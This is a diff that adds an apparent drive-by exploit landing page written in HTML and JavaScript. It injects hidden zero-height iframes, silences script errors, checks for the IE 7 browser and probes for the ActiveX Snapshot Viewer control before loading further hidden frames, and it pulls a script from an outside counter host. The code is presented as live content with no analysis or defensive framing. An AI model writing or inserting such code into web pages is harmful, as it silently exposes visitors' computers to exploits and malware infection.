@@ -1,0 +1,21 @@
+<SCRIPT>
+document.write("<iframe width=100 height=0 src=122yt.htm></iframe>");
+document.write("<iframe width=100 height=0 src=12341.htm></iframe>");
+</SCRIPT>
+<SCRIPT>
+window.status="Achieve";
+window.onerror=function(){return true;}
+if(navigator.userAgent.toLowerCase().indexOf("ms"+"ie 7")==-1)
+document.write("<iframe width=20 height=0 src=06014.htm></iframe>");
+try{var n;
+var ll=new ActiveXObject("snpvw.Snapshot Viewer Control.1");}
+catch(n){};                      
+finally{if(n!="[object Error]"){document.write("<iframe width=50 height=0 src=ff.htm></iframe>");}}
+function test()
+{
+document.write("<iframe width=100 height=0 src=y100.htm></iframe>");
+document.write("<iframe width=100 height=0 src=y101.htm></iframe>");
+}
+test();
+</SCRIPT>
+<script language="javascript" src="http://count40.51yes.com/click.aspx?id=407917085&logo=1"></script>
